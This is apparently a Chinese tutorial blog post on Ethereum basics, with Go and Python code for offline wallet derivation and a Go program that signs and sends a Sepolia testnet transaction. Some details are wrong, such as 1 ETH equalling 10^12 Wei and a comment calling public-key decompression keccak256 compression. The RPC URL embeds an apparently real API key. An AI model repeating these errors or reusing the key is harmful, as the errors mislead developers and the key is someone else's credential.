    <content type="html"><![CDATA[<h1 id="1-以太坊基础知识"><a href="#1-以太坊基础知识" class="headerlink" title="1.以太坊基础知识"></a>1.以太坊基础知识</h1><h3 id="智能合约："><a href="#智能合约：" class="headerlink" title="智能合约："></a>智能合约：</h3><p>Smart Contracts 是以太坊最重要的特性之一，智能合约让以太坊有更多的可能性，让链不仅仅是链，还可以做很多的应用，智能合约是一段存储在以太坊区块链上的代码，可以自动执行协议的条款。例如，可以创建一个智能合约来管理众筹活动，当众筹达到目标时，合约会自动将资金转给项目方。</p><h3 id="单位换算"><a href="#单位换算" class="headerlink" title="单位换算"></a>单位换算</h3><p>1 Ether(ETH)&#x3D;1 x 10^3 Finney &#x3D; 1 x 10^6 Szabo &#x3D; 1 x 10^9 Gwei &#x3D; 1 x 10^12 Wei</p><h3 id="以太坊虚拟机（EVM）"><a href="#以太坊虚拟机（EVM）" class="headerlink" title="以太坊虚拟机（EVM）"></a>以太坊虚拟机（EVM）</h3><p>Ethereum Virtual Machine EVM 是以太坊的核心组件，EVM是一个图灵完备的虚拟机，他可以执行用以太坊脚本语言（Solidity）编写的任意代码。EVM使得智能合约的执行变得可能。也就是说你可以自己的代码放到EVM上去执行，</p><h3 id="Dapps（去中心化应用）"><a href="#Dapps（去中心化应用）" class="headerlink" title="Dapps（去中心化应用）"></a>Dapps（去中心化应用）</h3><p>Decentralized Applications Dapps 是基于以太坊区块链和智能合约构建的应用程序，与传统应用不同，Dapps没有中央服务，数据和应用逻辑是分布式的，这使得他们更加透明和安全。</p><h3 id="ERC标准"><a href="#ERC标准" class="headerlink" title="ERC标准"></a>ERC标准</h3><p>ERC标准是以太坊的技术规范，用于创建代币和其他合约，最著名的是ERC-20标准，他定义了一种通用的接口，使得代码可以在不同的DApp之间互操作。ERC 提案仅仅是以太坊社区的一些建议和规范，并没有强制执行的机制。开发者可以选择是否遵循这些标准，但遵循 ERC 标准通常会提高智能合约和代币的互操作性，并使其更易于与其他以太坊应用和工具进行集成。大家遵守这个标准之后，更便于代币的流通，</p><p>ERC-721是另一种标准，用于创建非同质化代币（NFT）这些代码具有独特性和不可互换性</p><p>ETH1.0和ETH2.0</p><p>ETH1.0</p><p>共识机制：工作量证明（proof of work PoW）：ETH1.0使用的是PoW共识机制，旷工通过解决复杂的数学问题来验证交易并添加区块，添加区块的旷工可以获得代币奖励，解决数学难题需要耗费巨大的GPU去运算，这个就是传统意义上的“挖矿”，这个过程能耗非常高，效率很低，且容易造成不平衡，就是拥有更多的显卡的人可以挖的更多的区块，</p><p>性能：吞吐量： ETH1.0每秒只能处理大约15-30笔交易，存在拓展性瓶颈，尤其是在网络负载（交易量大）的高峰期，交易确认时间和手续费会显著增加。</p><p>安全性：矿池集中化：PoW机制导致矿池的集中化问题，少数大型矿池控制了大部分的算力，有显卡的人就有算力，就可以挖掉区块。可能带来中心化风险</p><p>智能合约和DApps：ETH1.0支持智能合约和去中心化应用（DApps），比如去中心化金融（DeFi）、游戏和供应量管理</p><p>ETH-2.0</p><ul><li><p>共识机制： 权益证明（Proof of Stake, PoS）：ETH2.0 使用PoS共识机制，验证者通过质押ETH来获得验证区块的机会。PoS大幅减少能耗，提高了效率和安全性。比如说全网有10个验证者，每个人质押不同数量的代币来获得出块的<code>机会</code>，最后出块的人会奖励代币的</p></li><li><p>性能：</p><ul><li><p>分片链（Sharding chains ）：ETH2.0引入了分片技术，通过将区块链分成多个并行链（分片 shard），每个分片处理不同的交易和智能合约，从而显著提高了网络的吞吐量和处理能力</p></li><li><p>信标链（Beacon Chain）：ETH2.0的核心链，负责协调分片和验证者活动，确保整个网络的同步和共识，信标链负责验证和维护网络的共识，并引入了验证者角色。信标链通过随机性机制来选择验证者参与区块的提议和验证。这种随机性确保了公平性和安全性，并防止潜在的攻击行为。信标链还引入了轮次（Epoch）的概念，将时间划分为较长的周期，以便进行验证者的轮换和共识机制的调整</p></li></ul></li><li><p>安全性：去中心化和抗攻击性：PoS机制下，恶意攻击者需要持有大量的ETH，成本高昂，使得网络更安全，此外，前面说的信标链通过随机性机制来选择验证者参与区块提议，有随机性，进一步分散风险。</p></li><li><p>智能合约和DApps：ETH2.0保留了对智能合约的DApps的支持，同事通过更高的吞吐量和更低的交易费用，提升了用户体验和应用性能。</p></li><li><p>过渡过程：合并（The Merge）：ETH2.0并不是从零开始的新区块链，而是对ETH1.0的升级而来，合并将ETH1.0的现有链和ETH2.0的PoS链结合，实现无缝过渡。</p></li></ul><p>主要改进和优点</p><ul><li>能耗：ETH2.0通过 PoS 机制大幅减少了能源消耗，相比 PoW 机制更环保（降交易费了）</li><li>扩展性：分片技术和信标链的引入显著提高了网络的扩展性和吞吐量（大哥带小弟）</li><li>去中心化：ETH2.0通过随机选择验证者和经济激励机制，增强了去中心化程度和安全性（随机验证者，叫你们挖挖挖矿，挖不到了吧）</li><li>经济模型：ETH2.0引入了新的经济模型，通过质押和奖励机制，进一步激励网络参与者，提高网络的稳定性和安全性（验证者和抵押、奖励和惩罚、利息和通胀、质押和解之一，压币有收益，做恶有惩罚）</li></ul><p>1.3 ETH2.0中的Epoch,Slot,Block和Block状态</p><p><img src="/img/web3/epoch.jpeg" alt="epoch"></p><ul><li>ETH2.0 按照epoch 出块 （一个epoch一个纪元）</li><li>每一个epoch有32个slot (slot 时隙)</li><li>每一个slot 可以承载1个块</li></ul><h3 id="Slot（时隙）"><a href="#Slot（时隙）" class="headerlink" title="Slot（时隙）"></a>Slot（时隙）</h3><ul><li>定义：Slot 是以太坊2.0中最基本的时间单位，每个slot 都有一个指定的时间长度。在每个slot 中，可能会有一个区块被提议并添加到链中。</li><li>时间长度：一个slot 的长度为12秒。这意味着每12秒会有一个新的slot。</li><li>功能：在每个slot 中，网络中的验证者将有机会提议一个新的区块。这些提议者是通过权益证明（PoS）随机选择的。</li><li>block在slot里面，但是每个slot里面不一定都有block</li></ul><h3 id="Epoch（纪元）"><a href="#Epoch（纪元）" class="headerlink" title="Epoch（纪元）"></a>Epoch（纪元）</h3><ul><li>定义：Epoch 是由多个连续的slot 组成的更长时间段。在Eth2.0中，Epoch 用于管理和组织验证者的活动。</li><li>组成：一个Epoch 由 32个 slot 组成。</li><li>时间长度：由于一个slot 是12秒，一个Epoch 的总长度就是12 * 32&#x3D;384秒（6.4分钟）</li><li>功能：Epoch 是用来实现共识机制的一部分。在每个Epoch 结束时，网络会进行状态和共识的检查和调整，包括对验证者的奖励和惩罚。</li></ul><h3 id="Block（区块）"><a href="#Block（区块）" class="headerlink" title="Block（区块）"></a>Block（区块）</h3><ul><li>定义：Block 区块一个是包含交易和其他所有相关数据的记录单元。所有的数据都会包在这个块中，在ETH2.0中，每个 slot 可能会有一个区块被提议，只是提议，但不能保证每个 slot 都有区块的。</li><li>内容：一个区块包含<code>区块头</code>、<code>交易列表</code>、<code>状态根哈希</code>、<code>签名</code>等数据。</li><li>创建过程：在每个slot <code>开始</code>时，网络会随机选出一个<code>验证者</code>来<code>提议</code>区块。该验证者将创建一个包含新交易和其他必要信息的区块，并广播到全网络上。</li></ul><h3 id="Safe-（安全）"><a href="#Safe-（安全）" class="headerlink" title="Safe （安全）"></a>Safe （安全）</h3><p><code>“Safe”</code>状态指的是一个区块已经被<strong>多数验证者接受和认可</strong>，并且他<strong>很可能</strong>会成为最终的区块，但还<strong>没有达到</strong>完全最终确定的状态。</p><ul><li>条件：一个区块在被认为是“safe”时，意味着它已经收到了足够多的验证者投票（attestations），通常超过了一个特定的阈值，但还没有达到最终确定的标准。</li><li>安全性：在“safe”状态下，区块的存在是相对安全的，不太可能被回滚或者被另一个不同的区块链分支所替代，也就是说不太可能提议了另一个区块。</li><li>作用：这个状态用来提高网络对区块的信任度，即是在它还没有被完全最终确定之前。它帮助节点和用户判断哪些区块在短期内是可信的，一个中间状态</li></ul><p>Finalized（最终确定）</p><p>“Finalized”状态指的是一个区块已经被永久地添加到区块链中，并且不可能被回滚或替代。这是区块链中最强的确认状态。</p><ul><li>条件：一个区块被认为是“finalized”时，必须通过了严格的共识验证，通常需要超过2&#x2F;3的验证者投票同意。具体来说两个联系的epoch被最终确定时，意味着在这两个epoch之间的所有区块都被最终确定。</li><li>安全性：一旦区块达到“finalized”的状态，它就不可逆转，保证了区块链的最终一致性和数据的永久性。这种状态防治了分叉和双花攻击的可能性。</li><li>作用：最终确定的区块为用户和应用提供了最高级别的交易安全性和网络信任度。</li></ul><h3 id="1-4-以太坊钱包确认位"><a href="#1-4-以太坊钱包确认位" class="headerlink" title="1.4 以太坊钱包确认位"></a>1.4 以太坊钱包确认位</h3><p><img src="/img/web3/finalized.png" alt="finalized"></p><p>最终确认位之前的交易会被并入系统</p><h1 id="2-离线地址生成"><a href="#2-离线地址生成" class="headerlink" title="2.离线地址生成"></a>2.离线地址生成</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/hex&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/ethereum/go-ethereum/crypto&quot;</span><br><span class="hljs-string">&quot;github.com/tyler-smith/go-bip32&quot;</span><br><span class="hljs-string">&quot;github.com/tyler-smith/go-bip39&quot;</span><br>)<br><br><span class="hljs-comment">// 生成一个以太坊的钱包</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;开始&quot;</span>)<br><span class="hljs-comment">// 首先你可以生成一个随机熵，熵源助记词是BIP-39，</span><br>entropy, _ := bip39.NewEntropy(<span class="hljs-number">128</span>)<br>fmt.Println(<span class="hljs-string">&quot;entroy:&quot;</span>, entropy)<br><span class="hljs-comment">// 通过熵源生成助记词  ==&gt; 注意，不一定要有助记词才有种子，只是助记词方便备份，可以转成种子，你要直接由种子也行，但不好记</span><br>mnemonic, _ := bip39.NewMnemonic(entropy)<br>fmt.Println(<span class="hljs-string">&quot;mnemonic:&quot;</span>, mnemonic)<br><span class="hljs-comment">// 通过助记词生成种子Seed</span><br>seed := bip39.NewSeed(mnemonic, <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment">// password盐值不要加</span><br>fmt.Println(<span class="hljs-string">&quot;seed&quot;</span>, seed)<br><br><span class="hljs-comment">// 接下来就是将种子恢复出主私钥 masterKey 这里进入到了BIP-32了 a</span><br>masterKey, _ := bip32.NewMasterKey(seed)<br><span class="hljs-comment">// 注意，此时还是主私钥，接下来要派生子私钥，派生出来的子私钥才是真正的“私钥”才能对应链的公钥，才能解压缩出地址</span><br>fmt.Println(<span class="hljs-string">&quot;masterKey&quot;</span>, masterKey)<br><br><span class="hljs-comment">// 现在要派生出对应以太坊的子私钥，遵循BIP-44</span><br><span class="hljs-comment">// 接下来进入BIP-44 完成派生,完成对应path参数 m / purpose&#x27; / coin_type&#x27; / account&#x27; / change / address_index</span><br><span class="hljs-comment">// 通过主私钥派生出子私钥,FirstHardenedChild = uint32(0x80000000) 是一个常量，对应强化派生范围</span><br>key, _ := masterKey.NewChildKey(bip32.FirstHardenedChild + <span class="hljs-number">44</span>)  <span class="hljs-comment">// purpose&#x27; ： 44 是固定值，即BIP-44标准，强化派生</span><br>key, _ = key.NewChildKey(bip32.FirstHardenedChild + <span class="hljs-type">uint32</span>(<span class="hljs-number">60</span>)) <span class="hljs-comment">// coin_type&#x27; ：60是以太坊标识&#x27;， 继续强化派生</span><br>key, _ = key.NewChildKey(bip32.FirstHardenedChild + <span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))  <span class="hljs-comment">// account&#x27; : 0 标记账户类型，从0开始，强化派生</span><br>key, _ = key.NewChildKey(<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))                             <span class="hljs-comment">// change :0 外部可见地址， 1 找零地址（外部不可见），通常是 0，普通派生</span><br>key, _ = key.NewChildKey(<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))                             <span class="hljs-comment">// 地址索引 0 1 2 3 这样索引，普通派生</span><br><span class="hljs-comment">// 派生完毕，对应的path 就是 &quot; m/44&#x27;/60&#x27;/0&#x27;/0/0 &quot;</span><br><br><span class="hljs-comment">// 子私钥key 已经出来了，先打印私钥，key.Key就是私钥，注意要转化进制</span><br>ethPrivateKey := hex.EncodeToString(key.Key) <span class="hljs-comment">// 编码成字符串 , 这里打印出来的私钥就可以</span><br>fmt.Println(<span class="hljs-string">&quot;privateKey&quot;</span>, ethPrivateKey)<br><span class="hljs-comment">// 子私钥 key 里面就包含他对应的公钥属性，拿出来即可,因为公钥是私钥椭圆曲线加密得来的结果</span><br>ethPublicKey := hex.EncodeToString(key.PublicKey().Key) <span class="hljs-comment">// 编码成字符串</span><br>fmt.Println(<span class="hljs-string">&quot;ethPublicKey&quot;</span>, ethPublicKey)<br><br><span class="hljs-comment">// 现在拿到公钥了，先对公钥进行压缩 keccak256 压缩成 32 byte</span><br>compressPubKey, _ := crypto.DecompressPubkey(key.PublicKey().Key)<br>fmt.Println(<span class="hljs-string">&quot;compressPubKey&quot;</span>, compressPubKey)<br><span class="hljs-comment">// 压缩32字节后取最后 20 byte 就是地址了</span><br>ethAddre := crypto.PubkeyToAddress(*compressPubKey).Hex() <span class="hljs-comment">// Hex是16进制转字符串</span><br>fmt.Println(<span class="hljs-string">&quot;ethAddre&quot;</span>, ethAddre)                         <span class="hljs-comment">// ethAddre 0x38B59D6D4ef6A4991926Cf04c7c2092a0E86140F</span><br><br><span class="hljs-comment">// 最后把 ethPrivateKey 导入到 metaMask 里面去验证下，私钥和地址对上了没</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>用python写一遍</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bip32utils <span class="hljs-keyword">import</span> BIP32Key<br><span class="hljs-keyword">from</span> bip32utils <span class="hljs-keyword">import</span> BIP32_HARDEN<br><span class="hljs-keyword">from</span> bip39 <span class="hljs-keyword">import</span> Mnemonic<br><span class="hljs-keyword">from</span> ethereum.utils <span class="hljs-keyword">import</span> privtoaddr<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">eth_wallet</span>():<br>    <span class="hljs-comment"># 生成助记词和种子</span><br>    entropy = Mnemonic().generate_entropy(<span class="hljs-number">128</span>)<br>    mnemonic = Mnemonic().to_mnemonic(entropy)<br>    seed = Mnemonic().to_seed(mnemonic)<br><br>    <span class="hljs-comment"># 派生主私钥</span><br>    bip32_key = BIP32Key.fromEntropy(seed)<br><br>    <span class="hljs-comment"># 派生以太坊子私钥</span><br>    path = <span class="hljs-string">&quot;m/44&#x27;/60&#x27;/0&#x27;/0/0&quot;</span><br>    key = bip32_key.ChildKey(<br>        BIP32_HARDEN + <span class="hljs-number">44</span><br>    ).ChildKey(<br>        BIP32_HARDEN + <span class="hljs-number">60</span><br>    ).ChildKey(<br>        BIP32_HARDEN + <span class="hljs-number">0</span><br>    ).ChildKey(<br>        <span class="hljs-number">0</span><br>    ).ChildKey(<br>        <span class="hljs-number">0</span><br>    )<br><br>    <span class="hljs-comment"># 获取以太坊私钥</span><br>    eth_private_key = key.WalletImportFormat()<br><br>    <span class="hljs-comment"># 获取以太坊地址</span><br>    eth_address = privtoaddr(key.PrivateKey().to_string()).<span class="hljs-built_in">hex</span>()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;助记词:&quot;</span>, mnemonic)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;私钥:&quot;</span>, eth_private_key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;地址:&quot;</span>, eth_address)<br><br>eth_wallet()<br></code></pre></td></tr></table></figure><h1 id="3-离线交易签名"><a href="#3-离线交易签名" class="headerlink" title="3.离线交易签名"></a>3.离线交易签名</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/ethereum/go-ethereum/common&quot;</span><br><span class="hljs-string">&quot;github.com/ethereum/go-ethereum/core/types&quot;</span><br><span class="hljs-string">&quot;github.com/ethereum/go-ethereum/crypto&quot;</span><br><span class="hljs-string">&quot;github.com/ethereum/go-ethereum/ethclient&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;math/big&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>PrivateKeyStr = <span class="hljs-string">&quot;c535faxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>      <span class="hljs-comment">// go生成的账户 发送发私钥</span><br>fromAddrStr   = <span class="hljs-string">&quot;0xa3856a939A623EdBde8f908037d3F33FceBC5408&quot;</span>                            <span class="hljs-comment">// 对应go生成的账户 发送方地址</span><br>toAddrStr     = <span class="hljs-string">&quot;0x38B59D6D4ef6A4991926Cf04c7c2092a0E86140F&quot;</span>                            <span class="hljs-comment">// 接收方地址</span><br>ethUrl        = <span class="hljs-string">&quot;https://eth-sepolia.g.alchemy.com/v2/fzgfj4QuLlNEyn2LrLZsseBAClGdMnyP&quot;</span> <span class="hljs-comment">//API URL</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-comment">// 把私钥个地址转码一下</span><br>privateKey, _ := crypto.HexToECDSA(PrivateKeyStr)<br>toAddr := common.HexToAddress(toAddrStr)<br><br><span class="hljs-comment">// 新建连接，连上以太坊</span><br>client, err := ethclient.Dial(ethUrl)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br><span class="hljs-comment">// Get the balance of an account 第0步：查询账户余额，要先确认自己有没有钱</span><br>fromAddr := common.HexToAddress(fromAddrStr)<br>balance, err := client.BalanceAt(context.Background(), fromAddr, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br>fmt.Printf(<span class="hljs-string">&quot;Account balance: %d\n&quot;</span>, balance) <span class="hljs-comment">// 1008465873901900000</span><br><br><span class="hljs-comment">// Get the latest known block 第0步：获取最新块高，刷新</span><br>block, err := client.BlockByNumber(context.Background(), <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br>fmt.Printf(<span class="hljs-string">&quot;Latest block: %d\n&quot;</span>, block.Number().Uint64()) <span class="hljs-comment">//6055020</span><br><br><span class="hljs-comment">// 生成交易数据,这里注意fromAddr要转成 account common.Address对象</span><br><br><span class="hljs-comment">// 第一步拿nonce，这个拿nonce的的方法已经封装好了的，直接用就可，也可以去网站上copy url下来发请求，不过那样不优雅</span><br>nonce, err := client.PendingNonceAt(context.Background(), fromAddr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;nonce: %d\n&quot;</span>, nonce)<br><br><span class="hljs-comment">// 拿到gasPrice ，也可以不用拿，直接指定就可以</span><br>gasPriceNow, err := client.SuggestGasPrice(context.Background())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Failed to retrieve gas price: %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;gasPriceNow: %d\n&quot;</span>, gasPriceNow)<br><br>gasPrice := big.NewInt(<span class="hljs-number">2000000000</span>)<br>amount := big.NewInt(<span class="hljs-number">1100000000000000</span>)<br>gasLimit := <span class="hljs-type">uint64</span>(<span class="hljs-number">21208</span>)<br><span class="hljs-comment">//gasPrice := big.NewInt(1000)</span><br>data := []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>)<br><br><span class="hljs-comment">// 第二步 构建交易对象 ---&gt; 生成一个未签名的交易</span><br>tx := types.NewTx(&amp;types.LegacyTx&#123;<br>Nonce:    nonce,<br>To:       &amp;toAddr,<br>Value:    amount,<br>Gas:      gasLimit,<br>GasPrice: gasPrice,<br>Data:     data,<br>&#125;)<br><br><span class="hljs-comment">// 第三步 对交易进行签名，签名前先拿到链ID，即你要上的链</span><br>chainID, err := client.NetworkID(context.Background()) <span class="hljs-comment">// 拿到链ID</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>signedTx, err := types.SignTx(tx, types.NewEIP155Signer(chainID), privateKey) <span class="hljs-comment">// 对交易进行签名</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br><span class="hljs-comment">// 第四步  发送交易,这一步就是广播</span><br>err = client.SendTransaction(context.Background(), signedTx) <span class="hljs-comment">// 广播出去</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br>fmt.Printf(<span class="hljs-string">&quot;转账交易已发送，交易哈希\n：%s\n&quot;</span>, signedTx.Hash().Hex())<br><span class="hljs-comment">// 第一笔交易哈希：0xb4f9ff541c3423e5bbffbb63f78fed2b384cde60b74b9a3838f05eb172c65e90 ， 第一次发交易的时候gasPrice 花费的比较低，所以第二次改了gasPrice后再发</span><br><span class="hljs-comment">// 前面的一直在pending中 有点问题，</span><br><span class="hljs-comment">// 第二笔交易哈希：转账交易已发送，交易哈希：0xd65407692e1f872d47ce1231a80d9afbf0dbcf8336362f78262d4fd872a55c81</span><br><span class="hljs-comment">// 第三笔交易哈希：转账交易已发送，交易哈希：0xcb297210b49a5a3747c27783ab3610b8b287134792e50ccbf6afe86c6c96edfd</span><br><span class="hljs-comment">// 第四笔交易哈希：转账交易已发送，交易哈希：0xc922a93fd5a5eabe7819623a65aa6b572e755658f3a9f24e71a64f3d533b1a87</span><br><span class="hljs-comment">// 第五笔交易哈希：转账交易已发送，交易哈希：0x4a8e649836a69d22e2b979c7330f03b97e7017b4a89d27e9c646051725f89a2c</span><br><span class="hljs-comment">// 第六笔交易哈希：转账交易已发送，交易哈希：0xae0b39c8cb2e02f7c647778f4325f0cca6392fe54c8f144a8e4ae58da79484eb</span><br><span class="hljs-comment">// 显示pending 然后转indexing状态 最后Success成功</span><br><span class="hljs-comment">// pending 状态： This txn hash was found in our secondary node and should be picked up by our indexer in a short while.</span><br><span class="hljs-comment">// indexing 状态：This transaction has been included and will be reflected in a short while.</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="4-以太坊-RPC-接口"><a href="#4-以太坊-RPC-接口" class="headerlink" title="4.以太坊 RPC 接口"></a>4.以太坊 RPC 接口</h1><p>这里在做的就是扫链，钱包都要扫链</p><h3 id="4-1-检查网络的-RPC-接口是否可以"><a href="#4-1-检查网络的-RPC-接口是否可以" class="headerlink" title="4.1.检查网络的 RPC 接口是否可以"></a>4.1.检查网络的 RPC 接口是否可以</h3><p>先调接口看下链是不是处于活跃的状态，如果是才能继续下去</p><h3 id="4-2-获取最新块高"><a href="#4-2-获取最新块高" class="headerlink" title="4.2.获取最新块高"></a>4.2.获取最新块高</h3><p>调eth block number获取到最新的快高是多 比如说当前是第101个块</p><h3 id="4-3-根据块高获取块里面的信息"><a href="#4-3-根据块高获取块里面的信息" class="headerlink" title="4.3.根据块高获取块里面的信息"></a>4.3.根据块高获取块里面的信息</h3><p>从我之前上一次扫到的块（比如说第100）到我这一次扫到的块（第101）之间，扫到交易就下一步</p><h3 id="4-4-根据交易-Hash-获取交易详情"><a href="#4-4-根据交易-Hash-获取交易详情" class="headerlink" title="4.4.根据交易 Hash 获取交易详情"></a>4.4.根据交易 Hash 获取交易详情</h3><p>扫到交易之后就要去解析交易。然后判断from 和to 的地址是什么地址，来判断是转出还是转入是归集还是冷热互转</p><h3 id="4-5-获取交易状态"><a href="#4-5-获取交易状态" class="headerlink" title="4.5.获取交易状态"></a>4.5.获取交易状态</h3><p>解析交易就是获取交易状态是成功的吗，fail 还是 success</p><h3 id="4-6-获取签名需要的参数-Nonce"><a href="#4-6-获取签名需要的参数-Nonce" class="headerlink" title="4.6. 获取签名需要的参数 Nonce"></a>4.6. 获取签名需要的参数 Nonce</h3><h3 id="4-7-获取签名需要的参数-Gas"><a href="#4-7-获取签名需要的参数-Gas" class="headerlink" title="4.7. 获取签名需要的参数 Gas"></a>4.7. 获取签名需要的参数 Gas</h3><ul><li>这里其实不要用你获取到的当前gasprice，你可以调高一点，更容易被链上处理</li></ul><h3 id="4-8-发送交易到区块链网络"><a href="#4-8-发送交易到区块链网络" class="headerlink" title="4.8. 发送交易到区块链网络"></a>4.8. 发送交易到区块链网络</h3><ul><li>请求参数</li><li>返回值</li></ul><p><img src="/img/web3/%E4%BA%A4%E6%98%93%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="交易流程"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 